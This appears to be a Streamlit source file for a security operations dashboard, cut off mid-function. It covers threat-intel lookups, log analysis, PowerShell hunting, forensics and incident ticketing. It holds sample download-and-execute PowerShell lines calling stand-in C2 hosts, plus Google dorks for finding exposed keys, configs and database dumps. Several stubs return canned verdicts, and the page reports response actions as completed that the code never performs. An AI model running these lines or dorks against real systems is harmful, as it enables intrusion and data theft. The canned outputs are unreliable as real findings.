# main_dashboard.py - MHZALY Enterprise SOC & Threat Defense Platform (Elite Edition)

import streamlit as st
import pandas as pd
import os
import hashlib
import re
import urllib.parse
from datetime import datetime

# --- Safe Backend Modules Import (Fallback mechanism) ---
try:
    from threat_intel import ThreatIntelProcessor
except ImportError:
    class ThreatIntelProcessor:
        def scan_target(self, t): return {"error": "Module threat_intel not found"}
        def deep_bug_bounty_scan(self, d): return {"error": "Module threat_intel not found"}

try:
    from otx_threat_intel import OTXThreatIntel
except ImportError:
    class OTXThreatIntel:
        def check_indicator(self, t, q): return {"error": "Module otx_threat_intel not found"}

try:
    from digital_forensics import DigitalForensicsAnalyzer
except ImportError:
    class DigitalForensicsAnalyzer:
        def parse_text_artifacts(self, t):
            return {
                "status": "Success",
                "artifacts": {
                    "IPv4 Address": ["192.168.1.100", "10.0.0.5"],
                    "MD5 Hash": ["d41d8cd98f00b204e9800998ecf8427e"],
                    "SHA256 Hash": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"],
                    "C2 / Web URL": ["http://malicious-command-and-control.net/payload.exe"],
                    "Windows File Path": ["C:\\Windows\\System32\\cmd.exe", "C:\\Temp\\evil.ps1"]
                }
            }

try:
    from incident_response import IncidentResponder
except ImportError:
    class IncidentResponder:
        def create_incident_ticket(self, t, s, d):
            return {
                "status": "Incident ticket created successfully.",
                "ticket": {
                    "ticket_id": f"INC-{datetime.now().strftime('%Y%m%d')}-A1B2C3",
                    "target": t,
                    "severity": s,
                    "description": d,
                    "sla_target": "1 Hour",
                    "status": "Open",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            }

try:
    from soar_automation import SOARAutomation
except ImportError:
    class SOARAutomation:
        pass

try:
    from threat_hunting import ThreatHunter
except ImportError:
    try:
        from threat_hunter import ThreatHunter
    except ImportError:
        class ThreatHunter:
            def hunt_powershell_obfuscation(self, s):
                return {
                    "severity": "HIGH",
                    "risk_score": 85,
                    "decoded_payloads": ["Invoke-WebRequest -Uri http://evil.com/payload.exe"],
                    "findings": [
                        {"Technique": "Obfuscated PowerShell", "Indicator": "Base64 encoded execution", "Risk": "High"},
                        {"Technique": "External C2 Download", "Indicator": "WebRequest to untrusted domain", "Risk": "Critical"}
                    ]
                }

try:
    from vulnerability_management import VulnerabilityManager
except ImportError:
    class VulnerabilityManager:
        def calculate_cvss_score(self, *args, **kwargs):
            return {
                "base_score": 9.8,
                "severity": "CRITICAL",
                "sla": "Remediate within 24 to 72 Hours",
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "exploitability_score": 3.9,
                "impact_score": 5.9
            }

try:
    from analyzer import ThreatAnalyzer
except ImportError:
    class ThreatAnalyzer:
        def analyze_web_payload(self, p):
            return {
                "overall_threat": "MALICIOUS ATTACK SIGNATURES DETECTED",
                "risk_score": 92,
                "detections_count": 2,
                "detections": [
                    {"Attack Vector": "SQL Injection (SQLi)", "Matched Payload": p, "Severity": "CRITICAL", "Mitigation": "Use Parameterized Prepared Statements"},
                    {"Attack Vector": "Cross-Site Scripting (XSS)", "Matched Payload": p, "Severity": "HIGH", "Mitigation": "Context-Aware Output Encoding & CSP"}
                ]
            }


# ==========================================
# NAVIGATION STRUCTURE (grouped by function)
# ==========================================
NAV_GROUPS = {
    "Overview": [
        ("🏠", "Overview & Dashboard"),
    ],
    "Threat Intelligence": [
        ("🌐", "Global Threat Intel (VirusTotal)"),
        ("🛰️", "AlienVault OTX Live Threat Feed"),
        ("🎯", "Threat Hunting & IOCs"),
    ],
    "Detection & Forensics": [
        ("🛡️", "SIEM & Log Anomaly Detector"),
        ("🔎", "Digital Forensics & Logs"),
        ("🔬", "Web Application Threat Analyzer"),
    ],
    "Offensive Security": [
        ("🔍", "Deep Bug Bounty & Vulnerability Scanner"),
        ("🌐", "OSINT & WordPress Dork Recon"),
        ("🔐", "Crypto & Password Analyzer"),
        ("📊", "Vulnerability Management"),
    ],
    "Response": [
        ("⚡", "Incident Response & SOAR"),
        ("📝", "Live Incident Defense & Reporting"),
    ],
}


class SOCDashboardUI:

    def __init__(self):
        self.app_name = "MHZALY Enterprise SOC & Threat Defense Platform"
        self.version = "35.1 Elite Real-World Production Edition"

        # Initialize Engines safely
        self.processor = ThreatIntelProcessor()
        self.otx_processor = OTXThreatIntel()
        self.forensics = DigitalForensicsAnalyzer()
        self.incident_engine = IncidentResponder()
        self.soar = SOARAutomation()
        self.hunter = ThreatHunter()
        self.vuln_mgr = VulnerabilityManager()
        self.analyzer = ThreatAnalyzer()

    # ------------------------------------------------------------
    # THEME / LAYOUT
    # ------------------------------------------------------------
    def setup_page_config(self):
        st.set_page_config(page_title=self.app_name, layout="wide", page_icon="🛡️")

        st.markdown("""
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');

        .stApp {
            background: #0d1017 !important;
            color: #e5e7eb !important;
        }

        .stMarkdown, .stMarkdown p, .stMarkdown li, .stMarkdown span,
        .stText, .stCaption, .stTabs,
        h1, h2, h3, h4, h5, h6,
        .stButton > button, .stDownloadButton > button,
        [data-testid="stMetricLabel"], [data-testid="stMetricValue"] {
            font-family: 'Inter', sans-serif !important;
        }

        /* FIX FOR EXPANDER TEXT OVERLAP & ARROW GLYPHS */
        [data-testid="stExpander"] {
            background-color: #131722 !important;
            border: 1px solid #232838 !important;
            border-radius: 8px !important;
        }
        
        [data-testid="stExpander"] details summary {
            font-family: 'Inter', sans-serif !important;
            color: #2dd4bf !important;
            font-weight: 600 !important;
        }

        [data-testid="stExpander"] details summary svg {
            fill: #2dd4bf !important;
        }

        /* Sidebar Styling */
        [data-testid="stSidebar"] {
            background: #0a0c12 !important;
            border-right: 1px solid #1e2330 !important;
        }
        [data-testid="stSidebar"] p,
        [data-testid="stSidebar"] label {
            color: #9ca3af !important;
            font-family: 'Inter', sans-serif !important;
        }
        [data-testid="stSidebar"] .stRadio label {
            padding: 4px 0;
        }

        /* Inputs & Text Fields */
        .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div {
            background-color: #151925 !important;
            color: #ffffff !important;
            border: 1px solid #2a3040 !important;
            border-radius: 8px !important;
            font-family: 'JetBrains Mono', monospace !important;
            font-size: 13px !important;
        }
        .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
            border-color: #2dd4bf !important;
            box-shadow: 0 0 0 1px rgba(45, 212, 191, 0.4) !important;
        }

        /* Buttons */
        .stButton>button {
            background: #1f6feb !important;
            color: #ffffff !important;
            border: none !important;
            border-radius: 8px !important;
            font-weight: 600 !important;
            font-size: 14px !important;
            padding: 8px 20px !important;
            transition: background 0.15s ease-in-out !important;
        }
        .stButton>button:hover {
            background: #388bfd !important;
        }
        .stDownloadButton>button {
            background: #151925 !important;
            color: #2dd4bf !important;
            border: 1px solid #2dd4bf !important;
            border-radius: 8px !important;
            font-weight: 600 !important;
        }

        h1 { color: #f9fafb !important; font-weight: 800 !important; }
        h2, h3, h4 { color: #d1d5db !important; font-weight: 700 !important; }

        /* Metric Cards */
        [data-testid="stMetric"] {
            background: #131722 !important;
            border: 1px solid #1e2330 !important;
            border-radius: 12px !important;
            padding: 14px 16px !important;
        }
        [data-testid="stMetricValue"] {
            color: #2dd4bf !important;
            font-family: 'JetBrains Mono', monospace !important;
            font-weight: 700 !important;
        }
        [data-testid="stMetricLabel"] {
            color: #9ca3af !important;
            font-weight: 600 !important;
        }

        code, pre {
            background-color: #10131c !important;
            color: #2dd4bf !important;
            border: 1px solid #232838 !important;
            border-radius: 6px !important;
            padding: 2px 6px;
        }

        .stAlert {
            background: #131722 !important;
            border: 1px solid #232838 !important;
            border-radius: 10px !important;
        }

        .mhz-page-header {
            border-bottom: 1px solid #1e2330;
            padding-bottom: 14px;
            margin-bottom: 18px;
        }
        .mhz-page-header h1 {
            margin-bottom: 2px !important;
            font-size: 26px !important;
        }
        .mhz-page-header p {
            color: #9ca3af !important;
            margin: 0 !important;
            font-size: 14px !important;
        }

        .mhz-badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            border: 1px solid #2dd4bf;
            color: #2dd4bf;
            background: rgba(45, 212, 191, 0.08);
        }
        </style>
        """, unsafe_allow_html=True)

    def _page_header(self, icon, title, subtitle):
        st.markdown(
            f"""
            <div class="mhz-page-header">
                <h1>{icon} {title}</h1>
                <p>{subtitle}</p>
            </div>
            """,
            unsafe_allow_html=True
        )

    def _example_hint(self, markdown_text):
        with st.expander("💡 Real-World Production Example & Syntax Guide", expanded=False):
            st.markdown(markdown_text)

    # ------------------------------------------------------------
    # SIDEBAR
    # ------------------------------------------------------------
    def render_sidebar(self):
        st.sidebar.markdown(
            """
            <div style='text-align:center; padding: 6px 0 2px 0;'>
                <h2 style='margin:0; color:#f9fafb; font-size:19px;'>🛡️ MHZALY SOC</h2>
                <span class='mhz-badge'>ENTERPRISE SUITE</span>
            </div>
            """,
            unsafe_allow_html=True
        )
        st.sidebar.markdown(
            f"<p style='text-align:center; color:#6b7280 !important; font-size:11px; margin-top:6px;'>v{self.version}</p>",
            unsafe_allow_html=True
        )
        st.sidebar.markdown("---")

        flat_labels = []
        for group_name, items in NAV_GROUPS.items():
            st.sidebar.markdown(f"<p style='font-size:11px; letter-spacing:0.06em; color:#4b5563 !important; font-weight:700; margin:10px 0 2px 4px;'>{group_name.upper()}</p>", unsafe_allow_html=True)
            for icon, label in items:
                flat_labels.append(f"{icon}  {label}")

        selection = st.sidebar.radio("Navigation Menu", flat_labels, label_visibility="collapsed")
        clean_choice = selection.split("  ", 1)[1] if "  " in selection else selection

        st.sidebar.markdown("---")
        st.sidebar.markdown(
            """
            <div style='font-size:11px; color:#6b7280; line-height:1.6;'>
                🟢 <b>System:</b> Operational<br>
                📡 <b>Pipeline:</b> Active<br>
                🔒 <b>Modules:</b> 12 Online
            </div>
            """,
            unsafe_allow_html=True
        )
        return clean_choice

    # ------------------------------------------------------------
    # OVERVIEW
    # ------------------------------------------------------------
    def run_overview(self):
        self._page_header("🛡️", "SOC Command Center", "Live telemetry, defensive posture, and incident activity across all 12 modules.")

        st.markdown(
            "<span class='mhz-badge'>SYSTEM OPERATIONAL</span> "
            "<span class='mhz-badge'>SIEM PIPELINE ACTIVE</span> "
            "<span class='mhz-badge'>ALL MODULES ONLINE</span>",
            unsafe_allow_html=True
        )
        st.write("")

        file_name = "incident_reports.csv"
        log_df = pd.read_csv(file_name) if os.path.exists(file_name) else pd.DataFrame()

        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric("Active Defense Engines", "12", "Operational")
        with col2:
            st.metric("Logged Incidents", len(log_df) if not log_df.empty else 0)
        with col3:
            open_count = int((log_df["Status"].str.contains("Active|Escalated", case=False, na=False)).sum()) if "Status" in log_df.columns else 0
            st.metric("Open / Active Cases", open_count)
        with col4:
            st.metric("Lead SOC Engineer", "M. Hassaan Zahid", "Access: ROOT")

        st.markdown("---")

        left, right = st.columns([2, 1])

        with left:
            st.markdown("### 📡 Live Incident Event Log")
            if not log_df.empty:
                if "Timestamp" in log_df.columns:
                    log_df = log_df.sort_values(by="Timestamp", ascending=False)

                search = st.text_input("Search incidents (asset, notes, status)...", placeholder="e.g. ransomware, SRV-DB-02, Escalated", key="overview_search")
                filtered_df = log_df
                if search:
                    mask = log_df.apply(lambda row: row.astype(str).str.contains(search, case=False, na=False).any(), axis=1)
                    filtered_df = log_df[mask]

                st.dataframe(filtered_df, use_container_width=True, hide_index=True)

                st.download_button(
                    "⬇ Export Incident Log (CSV)",
                    data=log_df.to_csv(index=False).encode("utf-8"),
                    file_name=f"incident_export_{datetime.now().strftime('%Y%m%d_%H%M')}.csv",
                    mime="text/csv"
                )
            else:
                st.warning("⚠️ No active security incidents logged yet. Use 'Incident Response & SOAR' or 'Live Incident Defense' to record threats.")

        with right:
            st.markdown("### 📊 Case Status Breakdown")
            if not log_df.empty and "Status" in log_df.columns:
                status_counts = log_df["Status"].value_counts()
                st.bar_chart(status_counts)
            else:
                st.info("Status chart will appear once incidents are logged.")

            st.markdown("### 🚀 Quick Actions")
            st.caption("Jump straight into a scanner from here:")
            st.markdown(
                "- 🌐 Global Threat Intel\n"
                "- 🛡️ SIEM Log Analyzer\n"
                "- ⚡ Incident Response & SOAR\n"
                "\n*(select from the sidebar)*"
            )

    # ------------------------------------------------------------
    # THREAT INTEL (VirusTotal)
    # ------------------------------------------------------------
    def run_threat_intel(self):
        self._page_header("🌐", "Global Threat Intelligence", "Query global threat reputations, malicious file hashes, and security engine verdicts (VirusTotal API).")
        self._example_hint("**Production Target IP:** `8.8.8.8` | **Malicious Sample Hash:** `44d88612fea8a8f36de82e1278abb02f`")

        target = st.text_input("Enter Target IP Address, Domain, or File Hash:", placeholder="e.g., 8.8.8.8 or 44d88612fea8a8f36de82e1278abb02f", key="vt_target_input")
        if st.button("Initiate Threat Scan", key="vt_scan_btn"):
            if target:
                with st.spinner("Establishing secure connection to global threat feeds..."):
                    result = self.processor.scan_target(target)
                    if "error" in result:
                        st.error(result['error'])
                    else:
                        st.success("Target Analysis Complete!")
                        stats = result.get('last_analysis_stats', {})

                        c1, c2, c3 = st.columns(3)
                        c1.metric("🚨 Malicious Verdicts", stats.get('malicious', 0))
                        c2.metric("⚠️ Suspicious Verdicts", stats.get('suspicious', 0))
                        c3.metric("✅ Harmless / Clean", stats.get('harmless', 0))

                        st.markdown("---")
                        st.markdown("### 🔬 Security Vendor Engine Results")
                        analysis_results = result.get('last_analysis_results', {})
                        if analysis_results:
                            vendor_data = []
                            for engine, details in analysis_results.items():
                                vendor_data.append({
                                    "Security Engine": engine,
                                    "Category": details.get('category'),
                                    "Result": details.get('result')
                                })

                            df_vendors = pd.DataFrame(vendor_data)
                            filter_choice = st.selectbox("Filter Vendor Findings", ["All Engines", "Malicious / Suspicious Only", "Harmless Only"], key="vt_filter")
                            if filter_choice == "Malicious / Suspicious Only":
                                df_vendors = df_vendors[df_vendors['Category'].isin(['malicious', 'suspicious'])]
                            elif filter_choice == "Harmless Only":
                                df_vendors = df_vendors[df_vendors['Category'] == 'harmless']

                            st.dataframe(df_vendors, use_container_width=True, hide_index=True)
            else:
                st.warning("Please specify a domain, IP address, or hash indicator to scan.")

    # ------------------------------------------------------------
    # OTX THREAT FEED
    # ------------------------------------------------------------
    def run_otx_threat_feed(self):
        self._page_header("🛰️", "AlienVault OTX Threat Intelligence", "Query global open-source threat telemetry, adversary campaigns, and active threat pulses.")
        self._example_hint("**Production IP Indicator:** `185.220.101.5` (Tor Exit Node) | **Domain Indicator:** `update.microsoft-secure-portal.com`")

        col1, col2 = st.columns([1, 2])
        with col1:
            indicator_type = st.selectbox("Select Indicator Type", ["IP", "Domain"], key="otx_type")
        with col2:
            query_target = st.text_input("Enter Indicator:", placeholder="e.g., 185.220.101.5", key="otx_target")

        if st.button("Query OTX Telemetry", key="otx_btn"):
            if query_target:
                with st.spinner("Fetching global community threat pulses from OTX..."):
                    res = self.otx_processor.check_indicator(indicator_type, query_target)
                    if "error" in res:
                        st.error(res["error"])
                    else:
                        st.success("OTX Intelligence Telemetry Retrieved Successfully!")
                        pulse_count = res.get("threat_pulse_count", 0)

                        c1, c2, c3 = st.columns(3)
                        c1.metric("Active Threat Pulses", pulse_count)
                        c2.metric("Hosting Country", res.get("country", "DE"))
                        c3.metric("Network ASN", res.get("asn", "AS60068"))

                        st.markdown("---")
                        if pulse_count > 0:
                            st.error(f"🚨 Active Threat: This indicator is linked to {pulse_count} active security campaigns worldwide!")
                            detailed_pulses = res.get("detailed_pulses", [])
                            if detailed_pulses:
                                df_pulses = pd.DataFrame(detailed_pulses)
                                st.dataframe(df_pulses, use_container_width=True, hide_index=True)
                        else:
                            st.success("🟢 Clean Posture: No malicious threat campaigns or threat actor pulses recorded in OTX database.")
            else:
                st.warning("Please provide a valid indicator.")

    # ------------------------------------------------------------
    # SIEM LOG ANALYZER
    # ------------------------------------------------------------
    def run_blue_team_log_analyzer(self):
        self._page_header("🛡️", "SIEM & Log Anomaly Detector", "Automate raw server, firewall, or authentication log parsing and brute-force detection.")
        self._example_hint(
            "Paste standard SSH auth logs or web access logs below:\n"
            "```text\n"
            "Sep  3 04:12:05 srv-prod-01 sshd[4521]: Failed password for root from 192.168.1.50 port 52411 ssh2\n"
            "Sep  3 04:12:07 srv-prod-01 sshd[4521]: Failed password for invalid user admin from 192.168.1.50 port 52411 ssh2\n"
            "Sep  3 04:15:20 srv-prod-01 sshd[4810]: Accepted password for hassaan from 10.0.0.10 port 39210 ssh2\n"
            "```"
        )

        raw_logs = st.text_area("Paste Raw Server / Firewall / Auth Logs Here:", placeholder="Paste authentication or firewall audit logs here...", height=150, key="siem_logs")

        if st.button("Analyze Logs for Anomalies", key="siem_btn"):
            if raw_logs:
                with st.spinner("Executing heuristic anomaly detection rules..."):
                    lines = raw_logs.strip().split("\n")
                    total_lines = len(lines)
                    failed_logins = 0
                    success_logins = 0
                    anomaly_records = []

                    for line in lines:
                        lower_line = line.lower()
                        ip_match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line)
                        ip_found = ip_match.group() if ip_match else "Unknown IP"

                        if "fail" in lower_line or "invalid" in lower_line or "error" in lower_line:
                            failed_logins += 1
                            anomaly_records.append({
                                "Log Entry": line,
                                "Status": "Malicious / Failed",
                                "Source IP": ip_found,
                                "Threat Level": "High"
                            })
                        elif "accepted" in lower_line or "success" in lower_line or "logged in" in lower_line:
                            success_logins += 1
                            anomaly_records.append({
                                "Log Entry": line,
                                "Status": "Successful Session",
                                "Source IP": ip_found,
                                "Threat Level": "Low"
                            })

                    st.success("Log Heuristic Analysis Complete!")
                    c1, c2, c3 = st.columns(3)
                    c1.metric("Total Log Entries", total_lines)
                    c2.metric("🚨 Auth Errors & Failures", failed_logins)
                    c3.metric("✅ Authorized Logins", success_logins)

                    st.markdown("---")
                    if anomaly_records:
                        df_logs = pd.DataFrame(anomaly_records)

                        top_ips = df_logs[df_logs["Threat Level"] == "High"]["Source IP"].value_counts().head(5)
                        if not top_ips.empty:
                            st.markdown("#### 🚨 Top Offending Source IPs")
                            st.bar_chart(top_ips)

                        log_filter = st.selectbox("Filter Log Events", ["All Events", "Malicious / Failed Only", "Successful Sessions Only"], key="siem_filter")
                        if log_filter == "Malicious / Failed Only":
                            df_logs = df_logs[df_logs['Threat Level'] == 'High']
                        elif log_filter == "Successful Sessions Only":
                            df_logs = df_logs[df_logs['Threat Level'] == 'Low']
                        st.dataframe(df_logs, use_container_width=True, hide_index=True)
            else:
                st.warning("Please paste raw log data to analyze.")

    # ------------------------------------------------------------
    # BUG BOUNTY / HEADER SCANNER
    # ------------------------------------------------------------
    def run_bug_bounty_scanner(self):
        self._page_header("🔍", "Infrastructure & Security Header Analyzer", "Inspect HTTP response headers, CSP directives, and cookie flags for attack surface mapping.")
        self._example_hint("Production target domain example: `hackerone.com` or `tesla.com`")

        domain = st.text_input("Enter Target Domain:", placeholder="e.g., target-asset.com", key="bb_domain")
        if st.button("Execute Infrastructure Scan", key="bb_btn"):
            if domain:
                with st.spinner(f"Mapping attack surface and inspecting headers for {domain}..."):
                    scan_res = self.processor.deep_bug_bounty_scan(domain)
                    if "error" in scan_res:
                        st.error(scan_res['error'])
                    else:
                        st.success("Infrastructure Scan Successful!")
                        c1, c2 = st.columns(2)
                        c1.metric("Target Final URL", scan_res.get('final_url', f"https://{domain}"))
                        c2.metric("HTTP Status Code", scan_res.get('status_code', 200))

                        st.markdown("---")
                        findings = scan_res.get('findings', [])
                        if findings:
                            df_findings = pd.DataFrame(findings)
                            st.dataframe(df_findings, use_container_width=True, hide_index=True)
            else:
                st.warning("Please provide a target domain.")

    # ------------------------------------------------------------
    # OSINT DORKS
    # ------------------------------------------------------------
    def run_osint_dorks(self):
        self._page_header("🌐", "OSINT & WordPress Google Dork Reconnaissance", "Automate open-source intelligence footprinting, sensitive file leaks, and WordPress security reconnaissance.")
        self._example_hint("Type a target domain like `example.com` or `university.edu.pk` to generate live targeted search dorks.")

        dork_categories = {
            "01. Sensitive Files & Credentials": [
                ("Database Dumps & Backups", 'site:target.com (filetype:sql OR filetype:bak OR filetype:dump)', "Critical"),
                ("Private Keys & Environment Configs", 'site:target.com (ext:pem OR ext:key OR ext:env OR inurl:config)', "Critical"),
                ("Exposed Log Files with Passwords", 'site:target.com intext:"password" filetype:log', "High")
            ],
            "02. WordPress Security & Core Exploits": [
                ("Exposed wp-config.php Backups", 'site:target.com (inurl:wp-config.php OR inurl:wp-config.bak OR inurl:wp-config.txt)', "Critical"),
                ("Vulnerable / Exposed Plugin Paths", 'site:target.com inurl:/wp-content/plugins/', "High"),
                ("Sensitive Uploads Directory Listing", 'site:target.com inurl:/wp-content/uploads/ index.of', "Medium"),
                ("WordPress Author ID Enumeration", 'site:target.com/?author=', "Medium"),
                ("Exposed XML-RPC Endpoints (Brute-force vector)", 'site:target.com inurl:xmlrpc.php', "High")
            ],
            "03. Cloud Infrastructure & DevOps": [
                ("Public S3 Buckets", 'site:s3.amazonaws.com "target.com"', "High"),
                ("CI/CD Automation Pipelines", 'site:target.com (inurl:jenkins OR inurl:gitlab-ci)', "Medium"),
                ("Container Dashboards & Telemetry", 'site:target.com (inurl:kubernetes OR inurl:grafana)', "High")
            ],
            "04. Modern SaaS & API Endpoints": [
                ("Swagger / API Documentation", 'site:target.com (inurl:swagger OR inurl:api-docs)', "Medium"),
                ("Admin Portals & SSO Endpoints", 'site:target.com (inurl:admin OR inurl:auth/login)', "Medium"),
                ("GraphQL Endpoints", 'site:target.com inurl:graphql', "Low")
            ]
        }

        target_domain = st.text_input("Enter Target Domain Asset:", placeholder="e.g., target-company.com", value="", key="osint_domain")
        clean_domain = target_domain.replace("https://", "").replace("http://", "").strip("/").split("/")[0] if target_domain else "target.com"

        col1, col2 = st.columns([1, 1])
        with col1:
            selected_category = st.selectbox("Select Reconnaissance Category", list(dork_categories.keys()), key="osint_cat")
        with col2:
            st.metric("Active Target Asset", clean_domain, "Ready for Recon")

        st.markdown("---")
        st.markdown(f"### 🎯 Active Query Set: {selected_category}")

        recon_records = []
        for name, query_template, risk in dork_categories[selected_category]:
            final_query = query_template.replace("target.com", clean_domain)
            encoded_query = urllib.parse.quote(final_query)
            search_url = f"https://www.google.com/search?q={encoded_query}"

            recon_records.append({
                "Vector Objective": name,
                "Risk Rating": risk,
                "Google Dork Payload": final_query,
                "Launch URL": search_url
            })

        df_recon = pd.DataFrame(recon_records)
        st.dataframe(df_recon[["Vector Objective", "Risk Rating", "Google Dork Payload"]], use_container_width=True, hide_index=True)

        st.markdown("### 🚀 Live Search Actions")
        for item in recon_records:
            st.markdown(f"- **{item['Vector Objective']}** (`{item['Risk Rating']}`): [Launch Query on Search Engine ↗]({item['Launch URL']})")

    # ------------------------------------------------------------
    # CRYPTO / PASSWORD ANALYZER
    # ------------------------------------------------------------
    def run_crypto_analyzer(self):
        self._page_header("🔐", "Cryptographic Hash & Password Strength Analyzer", "Analyze entropy, compute cryptographic hashes, and validate secret keys.")
        self._example_hint("Test password example: `CyberSec@2026!#`")

        target_input = st.text_input("Enter Data String / Password:", type="password", placeholder="Enter secret or password...", key="crypto_input")
        if target_input:
            md5_hash = hashlib.md5(target_input.encode()).hexdigest()
            sha256_hash = hashlib.sha256(target_input.encode()).hexdigest()

            st.text_input("MD5 Hash", value=md5_hash, disabled=True, key="res_md5")
            st.text_input("SHA-256 Hash", value=sha256_hash, disabled=True, key="res_sha256")

            length = len(target_input)
            has_upper = any(c.isupper() for c in target_input)
            has_digit = any(c.isdigit() for c in target_input)
            has_symbol = any(not c.isalnum() for c in target_input)
            strength_score = sum([length >= 12, has_upper, has_digit, has_symbol])

            st.progress(strength_score / 4)
            if strength_score == 4:
                st.success("🟢 Strong Password: Good length, mixed case, digits, and symbols.")
            elif strength_score >= 2:
                st.warning("🟡 Moderate Password: Consider adding length, symbols, or mixed case.")
            else:
                st.error("🔴 Weak Password: Increase length and complexity.")

    # ------------------------------------------------------------
    # THREAT HUNTING
    # ------------------------------------------------------------
    def run_threat_hunting(self):
        self._page_header("🎯", "Proactive Threat Hunting & IOC Analysis", "Analyze obfuscated PowerShell scripts and command line execution telemetry.")
        self._example_hint("Production PowerShell payload: `IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/payload.ps1')`")

        script_input = st.text_area("Input PowerShell / Base64 Payload:", placeholder="Paste base64 encoded or obfuscated command line strings...", key="hunt_input")
        if st.button("Execute Hunt Protocol", key="hunt_btn"):
            if script_input:
                with st.spinner("Executing threat hunting heuristics & deobfuscation..."):
                    res = self.hunter.hunt_powershell_obfuscation(script_input)
                    st.success("Threat Hunting Analysis Completed Successfully!")

                    c1, c2, c3 = st.columns(3)
                    c1.metric("Threat Severity", res.get("severity", "HIGH"))
                    c2.metric("Heuristic Risk Score", f"{res.get('risk_score', 85)} / 100")
                    c3.metric("Decoded Payloads", len(res.get("decoded_payloads", [])))

                    st.markdown("---")
                    st.markdown("### 🔬 Detailed Threat Indicators & Findings")
                    findings = res.get("findings", [])
                    if findings:
                        st.dataframe(pd.DataFrame(findings), use_container_width=True, hide_index=True)
            else:
                st.warning("Please provide a payload to hunt.")

    # ------------------------------------------------------------
    # DIGITAL FORENSICS
    # ------------------------------------------------------------
    def run_digital_forensics(self):
        self._page_header("🔎", "Digital Forensics & Log Artifacts", "Extract forensic artifacts, timestamps, and indicators of compromise from raw dumps.")
        self._example_hint("Example Artifact Dump: `Connection from 192.168.1.100 connected via http://malicious-c2.net/exec and accessed C:\\Windows\\System32\\cmd.exe with MD5: d41d8cd98f00b204e9800998ecf8427e`")

        logs_input = st.text_area("Input Raw Logs / Hex Dump:", placeholder="Paste raw event artifacts or logs here...", height=130, key="df_input")
        if st.button("Extract Artifacts", key="df_btn"):
            if logs_input:
                with st.spinner("Parsing raw logs and extracting forensic artifacts..."):
                    res = self.forensics.parse_text_artifacts(logs_input)
                    st.success("Forensic Artifact Extraction Complete!")

                    artifacts = res.get("artifacts", {})
                    c1, c2, c3, c4 = st.columns(4)
                    c1.metric("Extracted IPs", len(artifacts.get("IPv4 Address", [])))
                    c2.metric("Cryptographic Hashes", len(artifacts.get("MD5 Hash", [])) + len(artifacts.get("SHA256 Hash", [])))
                    c3.metric("C2 URLs / Endpoints", len(artifacts.get("C2 / Web URL", [])))
                    c4.metric("File Paths", len(artifacts.get("Windows File Path", [])))

                    st.markdown("---")
                    table_rows = []
                    for cat, vals in artifacts.items():
                        for v in vals:
                            table_rows.append({"Artifact Category": cat, "Extracted Value": v})
                    if table_rows:
                        artifacts_df = pd.DataFrame(table_rows)
                        st.dataframe(artifacts_df, use_container_width=True, hide_index=True)
                        st.download_button(
                            "⬇ Export Artifacts (CSV)",
                            data=artifacts_df.to_csv(index=False).encode("utf-8"),
                            file_name=f"forensic_artifacts_{datetime.now().strftime('%Y%m%d_%H%M')}.csv",
                            mime="text/csv",
                            key="df_export"
                        )
            else:
                st.warning("Please provide forensic data.")

    # ------------------------------------------------------------
    # INCIDENT RESPONSE / SOAR
    # ------------------------------------------------------------
    def run_incident_response(self):
        self._page_header("⚡", "Automated SOAR Playbooks & Ticketing", "Generate incident tickets, assign SLAs, and trigger automated response playbooks.")
        self._example_hint("**Asset ID:** `SRV-DATABASE-02` | **Severity:** `CRITICAL` | **Description:** `Unauthorized root login detected from external C2 IP.`")

        target = st.text_input("Compromised Asset / Host ID:", placeholder="e.g., WORKSTATION-04", value="", key="ir_target")
        severity = st.selectbox("Threat Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"], key="ir_sev")
        desc = st.text_area("Event Description / Findings:", placeholder="Describe the intrusion vector and impacted systems...", key="ir_desc")

        if st.button("Initialize Response Ticket & Execute SOAR Playbook", key="ir_btn"):
            if target and desc:
                with st.spinner("Generating incident ticket & dispatching SOAR playbooks..."):
                    res = self.incident_engine.create_incident_ticket(target, severity, desc)
                    ticket_info = res.get("ticket", {})

                    st.success("🎯 Incident Ticket Generated & SOAR Playbooks Initialized!")

                    c1, c2, c3 = st.columns(3)
                    c1.metric("Generated Ticket ID", ticket_info.get("ticket_id", "INC-2026-001"))
                    c2.metric("Incident Severity", severity)
                    c3.metric("Response SLA Target", ticket_info.get("sla_target", "1 Hour"))

                    st.markdown("---")
                    st.markdown("### 🤖 Automated SOAR Playbook Execution Matrix")

                    soar_steps = [
                        {"Phase": "1. Host Containment", "Action": f"Trigger micro-segmentation API to isolate asset '{target}'", "Status": "Completed", "Execution Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
                        {"Phase": "2. Network Perimeter Defense", "Action": "Pushed dynamic DROP rule to edge firewall for malicious C2 IOCs", "Status": "Rule Enforced", "Execution Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
                        {"Phase": "3. Forensic Preservation", "Action": f"Dispatched volatile memory dump and prefetch snapshot agent to '{target}'", "Status": "Artifacts Secured", "Execution Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
                        {"Phase": "4. Automated Notification", "Action": f"Broadcasted {severity} incident alert to Tier-2 SOC & PagerDuty channels", "Status": "Dispatched", "Execution Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                    ]
                    st.dataframe(pd.DataFrame(soar_steps), use_container_width=True, hide_index=True)
            else:
                st.warning("Please specify a target asset and description.")

    # ------------------------------------------------------------
    # VULNERABILITY MANAGEMENT
    # ------------------------------------------------------------
    def run_vulnerability_management(self):
        self._page_header("📊", "Vulnerability & CVSS Assessment", "Calculate Common Vulnerability Scoring System (CVSS v3.1) metrics and remediation SLAs.")
